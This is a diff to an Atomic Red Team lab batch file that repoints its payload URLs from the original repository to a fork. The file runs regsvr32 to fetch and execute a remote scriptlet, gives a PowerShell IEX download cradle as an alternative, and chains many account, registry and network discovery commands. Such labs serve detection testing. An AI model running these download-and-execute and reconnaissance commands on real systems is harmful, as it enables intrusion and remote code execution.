@@ -1,8 +1,8 @@
 :: Basic Test Lab One
-:: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct
+:: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/Windows/Payloads/RegSvr32.sct
 ::
 
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/theclintox/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
 
 :: NOTE it is a BAD idea to execute scripts from a repo that you do not control.
 :: NOTE We recommend executing from a server that you control.
@@ -18,11 +18,11 @@ regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-t
 
 :: Step 1. A payload executes Regsvr32.exe as seen in Lab One T1117
 
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/theclintox/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
 
 :: Step 2. This payload will execute an discovery sequence T1087
-::    https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat
-::	  Alternate Endings ;-) => powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"
+::    https://raw.githubusercontent.com/theclintox/atomic-red-team/master/Windows/Payloads/Discovery.bat
+::	  Alternate Endings ;-) => powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"
 
 net user Administrator /domain & net Accounts & net localgroup administrators & net use & net share & net group "domain admins" /domain & net config workstation & net accounts & net accounts /domain & net view & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices & reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify & reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit & reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell & reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell & reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run & wmic useraccount list & wmic useraccount get /ALL & wmic startup list brief & wmic share list & wmic service get name,displayname,pathname,startmode & wmic process list brief & wmic process get caption,executablepath,commandline & wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C whoami & ipconfig /displaydns & route print & netsh advfirewall show allprofiles & systeminfo & qwinsta & quser
 
